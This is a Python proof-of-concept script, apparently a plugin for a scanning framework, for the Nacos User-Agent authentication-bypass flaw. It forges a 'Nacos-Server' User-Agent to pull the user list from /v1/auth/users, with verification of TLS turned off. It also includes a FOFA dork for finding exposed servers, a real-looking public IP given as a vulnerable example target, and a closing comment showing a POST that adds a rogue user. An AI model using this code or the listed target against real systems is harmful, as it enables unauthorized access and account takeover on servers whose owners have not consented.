# coding:utf-8  
import requests
from lib.common import url_handle
# ...
import urllib3
urllib3.disable_warnings()
_info = {
    "author" : "jijue",                      # POC作者
    "version" : "1",                    # POC版本，默认是1  
    "CreateDate" : "2021-06-08",        # POC创建时间
    "UpdateDate" : "2021-06-08",        # POC创建时间
    "PocDesc" : """
    略  
    """,                                # POC描述，写更新描述，没有就不写

    "name" : "Nacos未授权访问",                        # 漏洞名称
    "AppName" : "Nacos",                     # 漏洞应用名称
    "AppVersion" : "Nacos <= 2.0.0-ALPHA.1",                  # 漏洞应用版本
    "VulnDate" : "2020-12-29",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
    "VulnDesc" : """
    Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。
    """,                                # 漏洞简要描述

    "fofa-dork":"title:\"Nacos\"",                     # fofa搜索语句
    "example" : "https://47.108.74.113/v1/auth/users?pageNo=1&pageSize=100",                     # 存在漏洞的演示url，写一个就可以了
    "exp_img" : "",                      # 先不管  

    "timeout" : 5,                      # 超时设定
}

def verify(host,proxy):
    """
    返回vuln

    存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

    不存在漏洞：vuln = [False,""]
    """
    vuln = [False,""]
    url = url_handle(host) + "/v1/auth/users?pageNo=1&pageSize=100" # url自己按需调整

    if proxy:
        proxies = {
        "http": "http://%s"%(proxy),
        "https": "http://%s"%(proxy),
        }
    headers = {"User-Agent":"Nacos-Server",
                "Connection":"close",
                "Content-Type": "application/x-www-form-urlencoded",}
    
    try:
        """
        检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
        """
        req = requests.get(url,headers = headers , timeout = _info["timeout"],verify = False)
        if req.status_code == 200 and "username" in req.text and "pageItems" in req.text:
            vuln = [True,req.text]
        else:
            vuln = [False,req.text]
    except Exception as e:
        raise e
    
    return vuln

# add user
# POST /v1/auth/users?username=ttt&password=ttt